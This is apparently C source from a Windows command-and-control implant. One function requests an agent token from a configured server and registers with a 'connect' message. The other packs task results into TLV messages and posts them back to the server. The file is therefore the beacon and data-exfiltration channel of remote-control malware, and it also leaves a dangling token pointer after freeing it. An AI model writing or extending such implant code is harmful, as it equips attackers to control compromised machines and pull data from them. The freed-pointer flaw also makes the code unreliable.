#include <stdbool.h>

#include <Windows.h>
#include <lmcons.h>

#include <http_client.h>
#include <types.h>

#include <config.h>

void authenticate() {
  char* agentToken = malloc(50);
  DWORD httpBytesRead;

  struct TLVBuild connectMessage;
  connectMessage.buf = malloc(10);
  connectMessage.allocsize = 10;
  connectMessage.bufsize = 0;

  addInt32(&connectMessage, -1);
  addString(&connectMessage, "connect");
  addString(&connectMessage, "");
  addString(&connectMessage, "");

  httpGet(host, port, "/r", 40, &httpBytesRead, agentToken);
  agentToken[httpBytesRead] = 0x00;
  
  agent.token = agentToken;
  agent.report_uri = malloc(strlen(agentToken) + 10);
  
  printf("got token: %s\n", agentToken);
  
  strcpy(agent.report_uri, "/t?token=");
  strcat(agent.report_uri, agentToken);
  
  httpPost(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize);

  free(connectMessage.buf);
  free(agentToken);
}

void sendData(int taskId, char* typ, char* error, int size, char * buff) {
  struct TLVBuild outputMessage;
  outputMessage.buf = malloc(50);
  outputMessage.allocsize = 50;
  outputMessage.bufsize = 0;

  addInt32(&outputMessage, taskId);
  addString(&outputMessage, typ);
  addString(&outputMessage, error);
  addBytes(&outputMessage, true, size, buff);
  
  DWORD bytesRead;
  printf("[+] Sending %lu bytes: %.*s\n", outputMessage.bufsize, outputMessage.bufsize, outputMessage.buf);

  httpPost(
    host, port, agent.report_uri, outputMessage.buf, outputMessage.bufsize
  );
}